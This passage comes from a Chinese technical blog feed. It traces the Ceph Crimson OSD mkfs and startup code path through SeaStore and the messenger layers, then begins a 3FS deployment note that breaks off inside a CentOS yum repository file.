函数中关键逻辑为:</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">shard_devices.local().primary_mkfs(sm_config)<br>    check_create_device(device_path, size)<br>    open_device(device_path)<br>    make_superblock(get_device_id(), sm_config, stat)<br>    write_superblock(get_device_id(), device, sb)<br>    device.close()<br>local_device.shard_mkfs() <span class="hljs-comment">// shard_devices.invoke_on_all(...)</span><br>    open_device(device_path)<br>    read_superblock(device, sd)<br>    sb.validate()<br>    tracker.reset(new SegmentStateTracker(shard_info.segments, sb.block_size))<br>    tracker-&gt;write_out(get_device_id(), device, shard_info.tracker_offset)<br>    device.close()<br></code></pre></td></tr></table></figure><p>其中 <code>shard_devices.local().primary_mkfs(sm_config)</code> 对应的函数为 <code>BlockSegmentManager::primary_mkfs</code> 。其内部逻辑如下:</p><ul><li><code>check_create_device(device_path, size)</code>: 通过 <code>seastar::open_file_dma</code> 函数来打开对应的 <code>block</code> 文件，并通过 <code>f.truncate</code> 和 <code>f.allocate(0, size)</code> 函数来调整对应文件的大小，用于后续存储数据。该步骤中的 <code>seastore_block_create</code> 配置用于控制是否创建 <code>block</code> ， 该参数默认为 <code>true</code> ；<code>seastore_device_size</code> 配置用于控制 <code>block</code> 的文件大小，该参数默认为 <code>50GB</code> 。</li><li><code>open_device(device_path)</code>: 通过 <code>seastar::open_file_dma</code> 方法来打开对应的 <code>block</code> 文件，用于后续的数据操作。</li><li><code>make_superblock(get_device_id(), sm_config, stat)</code>: 初始化 <code>superblock</code> 信息。其内部根据 <code>seastar::smp::count</code> 的数量，<code>seastore_segment_size</code> 参数（用于控制单个 <code>segment</code> 的大小，默认为 <code>64M</code> ）等信息来初始化 <code>superblock</code> 信息。</li><li><code>write_superblock(get_device_id(), device, sb)</code>: 将序列化后的 <code>superblock</code> 信息写入 <code>block</code> 的文件头部。</li><li><code>device.close()</code>: 关闭打开的 <code>device</code> 。</li></ul><p>之后通过调用 <code>shard_devices.invoke_on_all(...)</code> 函数，该函数是 <code>Seastar</code> 框架中使用的方法，用于在所有的 <code>seastar shard</code> 上执行给定的函数。之后每个 <code>shard</code> 上执行 <code>local_device.shard_mkfs()</code> 函数。其内部回依次打开 <code>device</code> ，读取 <code>superblock</code> 信息，校验 <code>superblock</code> 信息，更新 <code>tracker</code> 信息等；之后便关闭 <code>device</code> 。</p><blockquote><ol start="4"><li>device-&gt;mount()</li></ol></blockquote><p><code>device-&gt;mount()</code> 对应的函数为 <code>BlockSegmentManager::mount</code> 。</p><p><code>BlockSegmentManager::mount</code> 函数中关键逻辑为:</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">local_device.shard_mount() <span class="hljs-comment">// shard_devices.invoke_on_all(...)</span><br></code></pre></td></tr></table></figure><p>这里也是通过调用 <code>shard_devices.invoke_on_all</code> 来触发在每个 <code>shard</code> 中执行 <code>local_device.shard_mount()</code> 函数，因此每个 shard 中调用的函数其实是 <code>BlockSegmentManager::shard_mount()</code> ，该函数内部的执行逻辑主要包括打开 <code>device</code> ，读取 <code>superblock</code> 信息，校验 <code>superblock</code> 信息，更新 <code>tracker</code> 信息等。</p><blockquote><ol start="5"><li>local_store.mkfs_managers()</li></ol></blockquote><p>接着又通过调用 <code>shard_stores.invoke_on_all(...)</code> 来触发在每个 <code>shard</code> 中执行 <code>local_store.mkfs_managers()</code> 操作，对应的函数为 <code>SeaStore::Shard::mkfs_managers</code> 。</p><p><code>SeaStore::Shard::mkfs_managers</code> 函数中关键逻辑为:</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">init_managers()<br>transaction_manager-&gt;mkfs()<br>init_managers()<br>transaction_manager-&gt;mount()<br>repeat_eagain(...)<br>    transaction_manager-&gt;with_transaction_intr(...)<br>        onode_manager-&gt;mkfs(t)<br>        collection_manager-&gt;mkfs(t)<br>        transaction_manager-&gt;write_collection_root(t, coll_root)<br>        transaction_manager-&gt;submit_transaction(t)<br></code></pre></td></tr></table></figure><p>其中 <code>init_managers()</code> 函数指的是 <code>SeaStore::Shard::init_managers()</code> 函数，其内部会初始化 <code>transaction_manager</code> ， <code>collection_manager</code> ， <code>onode_manager</code> 对象。</p><ul><li><code>transaction_manager</code>: 初始化函数为 <code>TransactionManagerRef make_transaction_manager</code> ，该对象显然用于管理存储设备上的事务。</li><li><code>collection_manager</code>: 初始化函数为 <code>FlatCollectionManager::FlatCollectionManager</code> ；</li><li><code>onode_manager</code>: 初始化函数为 <code>FLTreeOnodeManager::FLTreeOnodeManager</code> ；</li></ul><p><strong>transaction_manager 相关执行逻辑:</strong></p><ul><li><code>transaction_manager-&gt;mkfs()</code>: 对应 <code>TransactionManager::mkfs</code> 函数；</li><li><code>transaction_manager-&gt;mount()</code>: 对应 <code>TransactionManager::mount</code> 函数；</li><li><code>transaction_manager-&gt;with_transaction_intr(...)</code>: 对应 <code>ExtentCallbackInterface::with_transaction_intr</code> 函数；</li></ul><p>其中 <code>TransactionManager::mkfs</code> 函数中关键逻辑为:</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">epm-&gt;mount()<br>journal-&gt;open_for_mkfs()<br>epm-&gt;open_for_write()<br>with_transaction_intr(...)<br>close()<br></code></pre></td></tr></table></figure><p>其中 <code>TransactionManager::mount</code> 函数中关键逻辑为:</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">cache-&gt;init()<br>epm-&gt;mount()<br>journal-&gt;replay(...)<br>journal-&gt;open_for_mount()<br>journal-&gt;get_trimmer().set_journal_head(start_seq)<br>with_transaction_weak(...)<br>epm-&gt;open_for_write()<br>epm-&gt;start_background()<br></code></pre></td></tr></table></figure><p>TODO:</p><p><strong>onode_manager 相关执行逻辑:</strong></p><p>相关操作为 onode_manager-&gt;mkfs(t) ， 对应的函数为 FLTreeOnodeManager::mkfs 函数。 之后继续调用 Btree::mkfs &#x3D;&gt;  Node::mkfs </p><p>TODO:</p><p><strong>collection_manager 相关执行逻辑:</strong></p><p>相关操作为 collection_manager-&gt;mkfs(t) </p><p>TODO:</p><blockquote><ol start="6"><li>prepare_meta(new_osd_fsid)</li></ol></blockquote><p><code>prepare_meta(new_osd_fsid)</code> 函数对应的是 <code>SeaStore::prepare_meta</code> 函数，其内部主要是写入一些元信息到对应的数据目录的文件中，包括向 <code>fsid</code> 文件中写入集群 id 信息；向 <code>type</code> 文件中写入后后端存储类型（比如 <code>seastore</code> ） ； 往 <code>mkfs_done</code> 文件中写入 <code>yes</code> 。</p><blockquote><ol start="7"><li>umount()</li></ol></blockquote><p><code>umount()</code> 函数对应的是 <code>SeaStore::umount</code> 函数，其内部会通过 <code>shard_stores.invoke_on_all</code> 函数通知所有的 <code>shard</code> 执行 <code>local_store.umount()</code> 操作。</p><h2 id="9-4、crimson-osd-start-逻辑"><a href="#9-4、crimson-osd-start-逻辑" class="headerlink" title="9.4、crimson osd start 逻辑"></a>9.4、crimson osd start 逻辑</h2><p>当 <code>osd</code> 通过 <code>mkfs</code> 初始化之后才会被正式的启动，这时候就会调用 <code>OSD::start</code> 函数启动。需要注意该函数内部限制当前的 <code>shard</code> 为 <code>PRIMARY_CORE</code> 。其中 <code>store.start()</code> 和 <code>store.mount()</code> 的执行逻辑之前在 <code>osd mkfs</code> 的逻辑中已经描述过了，这里不再赘述。部分实现比较详细或逻辑接近，因此放在一块一起解释。</p><p><strong>OSD::start 函数中关键逻辑为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">store.start()<br><span class="hljs-number">1.</span> pg_to_shard_mappings.start(...)<br><span class="hljs-number">2.</span> osd_singleton_state.start_single(...)<br><span class="hljs-number">3.</span> osd_states.start()<br><span class="hljs-number">4.</span> shard_services.start(...)<br><span class="hljs-number">5.</span> heartbeat.reset(...)<br>store.mount()<br><span class="hljs-number">6.</span> local_service.report_stats() <span class="hljs-comment">// shard_services.invoke_on_all(...)</span><br><span class="hljs-number">7.</span> store.report_stats()<br><span class="hljs-number">8.</span> stats_timer.arm_periodic(...)<br><span class="hljs-number">9.</span> open_meta_coll()<br><span class="hljs-number">10.</span> pg_shard_manager.get_meta_coll().load_superblock()<br><span class="hljs-number">11.</span> pg_shard_manager.set_superblock(superblock)<br><span class="hljs-number">12.</span> pg_shard_manager.get_local_map(superblock.current_epoch)<br><span class="hljs-number">13.</span> pg_shard_manager.update_map(<span class="hljs-built_in">std</span>::move(<span class="hljs-built_in">map</span>))<br><span class="hljs-number">14.</span> local_service.local_state.osdmap_gate.got_map(...) <span class="hljs-comment">// shard_services.invoke_on_all(...)</span><br><span class="hljs-number">15.</span> pg_shard_manager.load_pgs(store)<br><span class="hljs-number">16.</span> cluster_msgr-&gt;bind(pick_addresses(CEPH_PICK_ADDRESS_CLUSTER))<br>    cluster_msgr-&gt;start(dispatchers)<br>    public_msgr-&gt;bind(pick_addresses(CEPH_PICK_ADDRESS_PUBLIC))<br>    public_msgr-&gt;start(dispatchers)<br><span class="hljs-number">17.</span> monc-&gt;start()<br>    mgrc-&gt;start()<br><span class="hljs-number">18.</span> _add_me_to_crush()<br><span class="hljs-number">19.</span> monc-&gt;renew_subs()<br><span class="hljs-number">20.</span> heartbeat-&gt;start(...)<br><span class="hljs-number">21.</span> start_asok_admin()<br><span class="hljs-number">22.</span> log_client.set_fsid(monc-&gt;get_fsid())<br><span class="hljs-number">23.</span> start_boot()<br></code></pre></td></tr></table></figure><blockquote><p><strong>1. pg_to_shard_mappings.start(…)</strong></p></blockquote><p><code>pg_to_shard_mappings.start(...)</code> 的原始调用信息为 <code>pg_to_shard_mappings.start(0, seastar::smp::count)</code> 。由于 <code>pg_to_shard_mappings</code> 的定义为 <code>seastar::sharded&lt;PGShardMapping&gt; pg_to_shard_mappings</code> ，因此这里的 <code>start</code> 函数其实是调用 <code>seastar::sharded::start</code> 函数来初始化了 <code>PGShardMapping</code> 对象。在 <code>PGShardMapping</code> 对象初始化的过程中会向其内部的成员变量 <code>std::map&lt;core_id_t, unsigned&gt; core_to_num_pgs</code> 中添加 <code>seastar::smp::count</code> 个元素。</p><blockquote><p><strong>2. osd_singleton_state.start_single(…)</strong></p></blockquote><p><code>osd_singleton_state.start_single(...)</code> 的原始调用信息为 <code>osd_singleton_state.start_single(whoami, std::ref(*cluster_msgr), std::ref(*public_msgr), std::ref(*monc), std::ref(*mgrc))</code> 。由于 <code>osd_singleton_state</code> 的定义为 <code>seastar::sharded&lt;OSDSingletonState&gt; osd_singleton_state</code> ，因此这里的 <code>start_single</code> 函数其实是调用了 <code>seastar::sharded::start_single</code> 函数来创建了一个 <code>OSDSingletonState</code> 对象。在 <code>OSDSingletonState</code> 对象初始化的过程中会创建一些 <code>perf</code> 和 <code>recoverystate_perf</code> 对象指针。</p><blockquote><p><strong>3. osd_states.start()</strong></p></blockquote><p>由于 <code>osd_states</code> 的定义为 <code>seastar::sharded&lt;OSDState&gt; osd_states</code> ，因此这里的 <code>start</code> 函数其实是调用 <code>seastar::sharded::start</code> 函数来初始化了 <code>OSDState</code> 对象。</p><blockquote><p><strong>4. shard_services.start(…)</strong></p></blockquote><p><code>shard_services.start(...)</code> 的原始调用信息为 <code>shard_services.start(std::ref(osd_singleton_state), std::ref(pg_to_shard_mappings), whoami, startup_time, osd_singleton_state.local().perf, osd_singleton_state.local().recoverystate_perf, std::ref(store), std::ref(osd_states))</code> 。由于 <code>shard_services</code> 的定义为 <code>seastar::sharded&lt;ShardServices&gt; shard_services</code> ，因此这里的 <code>start</code> 函数其实是调用 <code>seastar::sharded::start</code> 函数来初始化了 <code>ShardServices</code> 对象。</p><blockquote><p><strong>5. heartbeat.reset(…)</strong></p></blockquote><p>重置 <code>heartbeat</code> 对象。</p><blockquote><p><strong>6. local_service.report_stats()</strong></p></blockquote><p>该函数的调用被封装在 <code>shard_services.invoke_on_all</code> 内部，意味着这会让每个 <code>shard</code> 执行 <code>local_service.report_stats()</code> 函数。但是只有在 <code>crimson_osd_stat_interval</code> 配置了非零的情况下才会执行该逻辑。 <code>crimson_osd_stat_interval</code> 参数默认为 <code>0</code> 。</p><blockquote><p><strong>7. store.report_stats()</strong></p></blockquote><p><code>store.report_stats()</code> 对应的函数为 <code>SeaStore::report_stats</code> 。</p><p><strong>SeaStore::report_stats 函数中关键逻辑为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">local_store.get_device_stats(report_detail) <span class="hljs-comment">// shard_stores.invoke_on_all</span><br>local_store.get_io_stats(report_detail) <span class="hljs-comment">// shard_stores.invoke_on_all</span><br>INFO(...);<br></code></pre></td></tr></table></figure><blockquote><p><strong>8. stats_timer.arm_periodic(…)</strong></p></blockquote><p><code>stats_timer.arm_periodic(...)</code> 对应的原始调用为 <code>stats_timer.arm_periodic(std::chrono::seconds(stats_seconds))</code> 。用于设置一个周期性的定时器，该定时器的运行是由 <code>Seastar</code> 框架的事件循环管理的，与函数调用的生命周期无关。</p><blockquote><p><strong>9. open_meta_coll</strong></p></blockquote><p><code>open_meta_coll</code> 对应的函数为 <code>OSD::open_meta_coll</code> 。需要注意该逻辑仅限 <code>PRIMARY_CORE</code> 对应的 <code>shard</code> 执行。</p><p><strong>SeaStore::report_stats 函数中关键逻辑为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">store.get_sharded_store().open_collection(<span class="hljs-type">coll_t</span>::meta())<br>pg_shard_manager.init_meta_coll(ch, store.get_sharded_store())<br></code></pre></td></tr></table></figure><blockquote><p><strong>10. pg_shard_manager.get_meta_coll().load_superblock()</strong></p></blockquote><p>对应的函数为 <code>OSDMeta::load_superblock</code> 。用于从 <code>store</code> 存储中读取 <code>superblock</code> 信息。</p><blockquote><p><strong>11. pg_shard_manager.set_superblock(superblock)</strong></p></blockquote><p>对应的函数为 <code>PGShardManager::set_superblock</code> 。 </p><p><strong>PGShardManager::set_superblock 函数中关键逻辑为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">get_osd_singleton_state().set_singleton_superblock(superblock)<br>local_service.local_state.update_shard_superblock(superblock) <span class="hljs-comment">// shard_services.invoke_on_all</span><br></code></pre></td></tr></table></figure><blockquote><p><strong>12. pg_shard_manager.get_local_map(superblock.current_epoch)</strong></p></blockquote><p>对应的函数为 <code>OSDSingletonState::get_local_map</code> 。</p><blockquote><p><strong>13. pg_shard_manager.update_map(std::move(map))</strong></p></blockquote><p>对应的函数为 <code>PGShardManager::update_map</code> 。</p><p><strong>PGShardManager::update_map 函数中关键逻辑为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">get_osd_singleton_state().update_map(...)<br>local.local_state.update_map(...) <span class="hljs-comment">// shard_services.invoke_on_all</span><br></code></pre></td></tr></table></figure><blockquote><p><strong>14. local_service.local_state.osdmap_gate.got_map(…)</strong></p></blockquote><p>原始的调用为 <code>local_service.local_state.osdmap_gate.got_map(osdmap-&gt;get_epoch())</code> ， 该函数的调用被封装在 <code>shard_services.invoke_on_all</code> 内部，意味着这会让每个 <code>shard</code> 执行 <code>local_service.local_state.osdmap_gate.got_map(osdmap-&gt;get_epoch())</code> 函数。</p><blockquote><p><strong>15. pg_shard_manager.load_pgs(store)</strong></p></blockquote><p>对应的函数为 <code>PGShardManager::load_pgs</code> 。</p><p><strong>PGShardManager::load_pgs 函数中关键逻辑为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">store.list_collections()<br><span class="hljs-comment">// seastar::parallel_for_each</span><br>get_pg_to_shard_mapping().get_or_create_pg_mapping(pgid, shard_core)<br>shard_services.load_pg(pgid)<br>per_shard_state.pg_map.pg_loaded(pgid, <span class="hljs-built_in">std</span>::move(pg))<br></code></pre></td></tr></table></figure><blockquote><p><strong>16. cluster_msgr 和 public_msgr</strong></p></blockquote><p><strong>对应的批量的原始调用为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">cluster_msgr-&gt;bind(pick_addresses(CEPH_PICK_ADDRESS_CLUSTER))<br>cluster_msgr-&gt;start(dispatchers)<br>public_msgr-&gt;bind(pick_addresses(CEPH_PICK_ADDRESS_PUBLIC))<br>public_msgr-&gt;start(dispatchers)<br></code></pre></td></tr></table></figure><p><code>pick_addresses</code> 函数执行的时候，其内部仅会选择 <code>message v2</code> 的地址，因此从这里可以看出在 <code>crimson osd</code> 中不支持 <code>message v1</code> 。</p><p><code>bind</code> 函数对应的是 <code>SocketMessenger::bind</code> 。 <code>start</code> 函数对应的是 <code>SocketMessenger::start</code> 。</p><p><strong>SocketMessenger::bind 函数中关键逻辑为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">try_bind(addrs, local_conf()-&gt;ms_bind_port_min, local_conf()-&gt;ms_bind_port_max)<br>do_listen(<span class="hljs-type">entity_addrvec_t</span>&#123;to_bind&#125;)<br>ShardedServerSocket::create(dispatch_only_on_sid)<br>listener-&gt;listen(listen_addr)<br>    seastar::listen(s_addr, lo) <span class="hljs-comment">// this-&gt;container().invoke_on_all</span><br></code></pre></td></tr></table></figure><p>从上面中可以看出会让每个 <code>shard</code> 都监听相同的端口。</p><p><strong>SocketMessenger::start 函数中关键逻辑为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">listener-&gt;accept([this](SocketRef _socket, <span class="hljs-type">entity_addr_t</span> peer_addr) &#123;<br>    assert(get_myaddr().is_msgr2());<br>    SocketFRef socket = seastar::make_foreign(<span class="hljs-built_in">std</span>::move(_socket));<br>    <span class="hljs-comment">// 对于 client 和 cluster 的消息，这里的 fix 是 false </span><br>    <span class="hljs-comment">// 对于 heart beat 的消息，这里的 fix 是 true</span><br>    <span class="hljs-keyword">if</span> (listener-&gt;is_fixed_shard_dispatching()) &#123;<br>        <span class="hljs-keyword">return</span> accept(<span class="hljs-built_in">std</span>::move(socket), peer_addr);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 转发请求到对应的 shard 中</span><br>        <span class="hljs-keyword">return</span> seastar::smp::submit_to(sid, [this, peer_addr, socket = <span class="hljs-built_in">std</span>::move(socket)]() mutable &#123;<br>            <span class="hljs-keyword">return</span> accept(<span class="hljs-built_in">std</span>::move(socket), peer_addr);<br>        &#125;);<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><blockquote><p><strong>17. monc 和 mgrc 的 start</strong></p></blockquote><p><strong>对应的批量的原始调用为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">monc-&gt;start()<br>mgrc-&gt;start()<br></code></pre></td></tr></table></figure><p>其中 <code>monc-&gt;start()</code> 对应的函数为 <code>crimson::mon::Client::start</code> 。 <code>mgrc-&gt;start()</code> 对应的函数为 <code>crimson::mgr::Client::start</code> 。</p><p><strong>crimson::mon::Client::start 函数中关键逻辑为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">auth_registry.refresh_config()<br>load_keyring()<br>monmap.build_initial(crimson::common::local_conf(), <span class="hljs-literal">false</span>)<br>authenticate()<br>timer.arm_periodic(interval)<br></code></pre></td></tr></table></figure><p><strong>crimson::mgr::Client::start 函数中关键逻辑为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">seastar::now()<br></code></pre></td></tr></table></figure><blockquote><p><strong>18. _add_me_to_crush()</strong></p></blockquote><p>该函数对应的是 <code>OSD::_add_me_to_crush</code> 。在该函数中，如果 <code>osd_crush_update_on_start</code> 配置为 <code>true</code> ，则会在 <code>osd</code> 启动时尝试将自己的信息添加到 <code>crush map</code> 中。</p><p><strong>OSD::_add_me_to_crush 函数中关键逻辑为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">local_conf().get_val&lt;<span class="hljs-type">bool</span>&gt;(<span class="hljs-string">&quot;osd_crush_update_on_start&quot;</span>)<br>local_conf().get_val&lt;<span class="hljs-type">double</span>&gt;(<span class="hljs-string">&quot;osd_crush_initial_weight&quot;</span>)<br>store.stat()<br>get_weight()<br>loc.init_on_startup()<br>monc-&gt;run_command(<span class="hljs-built_in">std</span>::move(cmd), &#123;&#125;)<br></code></pre></td></tr></table></figure><blockquote><p><strong>19. monc-&gt;renew_subs()</strong></p></blockquote><p>对应的函数为 <code>crimson::mon::Client::renew_subs</code> 。 内部逻辑为向 <code>monitor</code> 发送 <code>CEPH_MSG_MON_SUBSCRIBE</code> 消息，用于订阅 <code>osd_pg_creates</code> ， <code>mgrmap</code> ， <code>osdmap</code> 的变更消息。</p><blockquote><p><strong>20. heartbeat-&gt;start(…)</strong></p></blockquote><p>原始的调用为 <code>heartbeat-&gt;start(pick_addresses(CEPH_PICK_ADDRESS_PUBLIC), pick_addresses(CEPH_PICK_ADDRESS_CLUSTER))</code> , 对应的函数为 <code>Heartbeat::start</code> 。</p><blockquote><p><strong>21. start_asok_admin()</strong></p></blockquote><p>对应的函数为 <code>OSD::start_asok_admin</code> 。 用于创建本地的 <code>socket</code> 文件，并注册可执行的命令。</p><blockquote><p><strong>22. log_client.set_fsid(monc-&gt;get_fsid())</strong></p></blockquote><p>设置日志记录中的 <code>fsid</code> 信息。</p><blockquote><p><strong>23. start_boot()</strong></p></blockquote><p>对应的函数为 <code>OSD::start_boot</code> 。</p><p><strong>OSD::start_boot 函数中关键逻辑为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">pg_shard_manager.set_preboot()<br>monc-&gt;get_version(<span class="hljs-string">&quot;osdmap&quot;</span>)<br>_preboot(oldest, newest)<br></code></pre></td></tr></table></figure><h1 id="十、相关资料"><a href="#十、相关资料" class="headerlink" title="十、相关资料"></a>十、相关资料</h1><ul><li><a href="https://ceph.io/en/news/crimson/">https://ceph.io/en/news/crimson/</a></li><li><a href="https://ceph.io/en/news/blog/2023/crimson-multi-core-scalability/">https://ceph.io/en/news/blog/2023/crimson-multi-core-scalability/</a></li><li><a href="https://ceph.io/en/news/blog/2025/crimson-T-release/">https://ceph.io/en/news/blog/2025/crimson-T-release/</a></li><li><a href="https://docs.ceph.com/en/latest/dev/crimson/crimson/">https://docs.ceph.com/en/latest/dev/crimson/crimson/</a></li><li><a href="https://docs.ceph.com/en/latest/cephadm/install/#bootstrap-a-new-cluster">https://docs.ceph.com/en/latest/cephadm/install/#bootstrap-a-new-cluster</a></li><li><a href="https://www.51cto.com/article/749735.html">https://www.51cto.com/article/749735.html</a></li><li><a href="https://zhuanlan.zhihu.com/p/667949613">https://zhuanlan.zhihu.com/p/667949613</a></li><li><a href="https://docs.redhat.com/zh-cn/documentation/red_hat_ceph_storage/7/html/administration_guide/crimson">https://docs.redhat.com/zh-cn/documentation/red_hat_ceph_storage/7/html/administration_guide/crimson</a></li><li><a href="https://ceph.io/en/news/blog/2023/crimson-multi-core-scalability/">https://ceph.io/en/news/blog/2023/crimson-multi-core-scalability/</a></li><li><a href="https://www.icviews.cn/semiCommunity/postDetail/6586">https://www.icviews.cn/semiCommunity/postDetail/6586</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Ceph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3FS 集群部署笔记</title>
      <link href="/2025/05/23/3fs-deploy/"/>
      <url>/2025/05/23/3fs-deploy/</url>
      
        <content type="html"><![CDATA[<h1 id="一、3FS-介绍"><a href="#一、3FS-介绍" class="headerlink" title="一、3FS 介绍"></a>一、3FS 介绍</h1><p>3FS (Fire-Flyer File System) 是一款高性能分布式文件系统。本文详细介绍了在 CentOS 8.5 环境下，从依赖安装、编译配置到集群部署的全过程，包括 Soft-RoCE 模拟 RDMA、FoundationDB 和 ClickHouse 的配置，以及存储拓扑和客户端挂载。适用于开发者快速搭建高性能存储集群。</p><p>3FS (Fire-Flyer File System) 项目仓库: <a href="https://github.com/deepseek-ai/3FS">https://github.com/deepseek-ai/3FS</a> 。</p><h1 id="二、编译安装"><a href="#二、编译安装" class="headerlink" title="二、编译安装"></a>二、编译安装</h1><p>为了支持多种运行环境的编译安装，3FS 提供了一些 <a href="https://github.com/deepseek-ai/3FS/tree/main/dockerfile">Dockerfile</a> 可供参考。</p><h2 id="2-1、安装依赖软件"><a href="#2-1、安装依赖软件" class="headerlink" title="2.1、安装依赖软件"></a>2.1、安装依赖软件</h2><p>本测试环境使用的系统版本是 CentOS 8.5.2111 ，是比较老的系统版本，为了能够顺利编译安装 3FS ，需要安装一些依赖软件。</p><p>这里是在每台需要运行 3FS 的机器上执行下面的编译安装命令。</p><p><strong>&#x2F;etc&#x2F;yum.repos.d&#x2F;centos-all.repo 文件内容:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[appstream]<br>name=CentOS-8.5.2111 - AppStream - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/AppStream/<span class="hljs-variable">$basearch</span>/os/<br>        https://mirrors.tuna.tsinghua.edu.cn/centos-vault/8.5.2111/AppStream/<span class="hljs-variable">$basearch</span>/os/<br>        https://mirrors.ustc.edu.cn/centos-vault/8.5.2111/AppStream/<span class="hljs-variable">$basearch</span>/os/<br>enabled=1<br>gpgcheck=0<br>priority=1<br><br>[baseos]<br>name=CentOS-8.5.2111 - BaseOS - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/BaseOS/<span class="hljs-variable">$basearch</span>/os/<br>        https://mirrors.tuna.tsinghua.edu.cn/centos-vault/8.5.2111/BaseOS/<span class="hljs-variable">$basearch</span>/os/<br>        https://mirrors.ustc.edu.cn/centos-vault/8.5.2111/BaseOS/<span class="hljs-variable">$basearch</span>/os/<br>enabled=1<br>gpgcheck=0<br>priority=1<br><br>[cr]<br>name=CentOS-8.5.2111 - ContinuousRelease - aliyun<br>baseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/cr/<span class="hljs-variable">$basearch</span>/os/<br>        https://mirrors.tuna.tsinghua.edu.cn/centos-vault/8.5.2111/cr/<span class="hljs-variable">$basearch</span>/os/<br>        https://mirrors.ustc.edu.cn/centos-vault/8.5.2111/cr/<span class="hljs-variable">$basearch</span>/os/<br>enabled=0<br>gpgcheck=0<br>priority=1<br><br>[debuginfo]<br>name=CentOS-8.5.2111 - Debuginfo - aliyun<br>baseurl=https://mirrors.aliyun.com/centos-debuginfo/8/<span class="hljs-variable">$basearch</span>/<br>enabled=0<br>gpgcheck=0<br>priority=1<br><br>[devel]<br>name=CentOS-8.5.2111 - Devel - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/Devel/<span class="hljs-variable">$basearch</span>/os/<br>        https://mirrors.tuna.tsinghua.edu.cn/centos-vault/8.5.2111/Devel/<span class="hljs-variable">$basearch</span>/os/<br>        https://mirrors.ustc.edu.cn/centos-vault/8.5.2111/Devel/<span class="hljs-variable">$basearch</span>/os/<br>enabled=0<br>gpgcheck=0<br>priority=1<br><br>[extras]<br>name=CentOS-8.5.2111 - Extras - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/extras/<span class="hljs-variable">$basearch</span>/os/<br>        https://mirrors.tuna.tsinghua.edu.cn/centos-vault/8.5.2111/extras/<span class="hljs-variable">$basearch</span>/os/<br>        https://mirrors.ustc.edu.cn/centos-vault/8.5.2111/extras/<span class="hljs-variable">$basearch</span>/os/<br>enabled=1<br>gpgcheck=0<br>priority=1<br><br>[fasttrack]<br>name=CentOS-8.5.2111 - FastTrack - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/fasttrack/<span class="hljs-variable">$basearch</span>/os/<br>        https://mirrors.tuna.tsinghua.edu.cn/centos-vault/8.5.2111/fasttrack/<span class="hljs-variable">$basearch</span>/os/<br>        https://mirrors.ustc.edu.cn/centos-vault/8.5.2111/fasttrack/<span class="hljs-variable">$basearch</span>/os/<br>enabled=0<br>gpgcheck=0<br>priority=1<br><br>[ha]<br>name=CentOS-8.5.2111 - HighAvailability - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/HighAvailability/<span class="hljs-variable">$basearch</span>/os/<br>        https://mirrors.tuna.tsinghua.edu.cn/centos-vault/8.5.2111/HighAvailability/<span class="hljs-variable">$basearch</span>/os/<br>        https://mirrors.ustc.edu.cn/centos-vault/8.5.2111/HighAvailability/<span class="hljs-variable">$basearch</span>/os/<br>enabled=0<br>gpgcheck=0<br>priority=1<br><br>[plus]<br>name=CentOS-8.5.2111 - Plus - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/centosplus/<span class="hljs-variable">$basearch</span>/os/<br>        https://mirrors.tuna.tsinghua.edu.cn/centos-vault/8.5.2111/centosplus/<span class="hljs-variable">$basearch</span>/os/<br>        https://mirrors.ustc.edu.cn/centos-vault/8.5.2111/centosplus/<span class="hljs-variable">$basearch</span>/os/<br>enabled=0<br>gpgcheck=0<br>priority=1<br><br>[powertools]<br>name=CentOS-8.5.2111 - PowerTools - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/PowerTools/<span class="hljs-variable">$basearch</span>/os/<br>        https://mirrors.tuna.tsinghua.edu.cn/centos-vault/8.5.2111/PowerTools/<span class="hljs-variable">$basearch</span>/os/<br>        https://mirrors.ustc.edu.cn/centos-vault/8.5.2111/PowerTools/<span class="hljs-variable">$basearch</span>/os/<br>enabled=1<br>gpgcheck=0<br>priority=1<br><br>[baseos-source]<br>name=CentOS-8.5.2111 - BaseOS-Source - aliyun,tsinghua,ustc<br>baseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/BaseOS/<span class="hljs-variable">$basearch</span>/Source/<br>        